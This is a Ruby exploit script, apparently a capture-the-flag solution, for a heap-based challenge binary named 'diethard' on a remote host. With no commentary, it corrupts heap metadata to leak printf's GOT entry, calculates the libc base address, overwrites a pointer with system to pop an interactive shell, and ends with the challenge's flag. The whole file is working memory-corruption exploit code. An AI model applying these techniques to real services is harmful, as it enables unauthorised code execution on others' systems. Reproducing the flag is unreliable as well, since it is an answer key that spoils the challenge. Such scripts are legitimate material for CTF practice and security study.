#!/usr/bin/env ruby
# encoding: ascii-8bit
require_relative '../../zocket/zocket'
require 'pry'
require 'pwn'      # https://github.com/peter50216/pwntools-ruby
require 'heapinfo' # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')

host, port = '202.120.7.194', 6666
@local = false
(host = '127.0.0.1'; @local = true) if ARGV.empty?
$z = Zocket.new host, port #, logger: HexLogger.new
def z;$z;end
@p = 'diethard'
$h = heapinfo(@p)
$elf = ELF.new(@p)
def elf; $elf; end
def h;$h.reload!;end
#================= Exploit Start ====================
def pt;z.gets " 3. Exit", do_log: false;end
def add(len, data)
  pt
  z.puts 1
  z.puts len
  z.write(data.end_with?("\n") ? data : data + "\n")
end

add(1024, 'A')
add(1024, 'A')

add(2017, p64(8) + p64(8) + p64(elf.got.printf)[0,6])

pt
z.puts 2
z.gets '1. '
libc = ELF.new('libc.so.6')
libc.address = z.read(8).u64 - libc.symbols.printf
h.offset(libc.address)

z.puts 2

add(2017, p64(8) + p64(8) + p64(libc.address+0x1633e8) + libc.symbols.system.p64)

z.puts 2

z.interact

# flag{W33_g0t_H34p_me7ad4t4_!n_BSS}
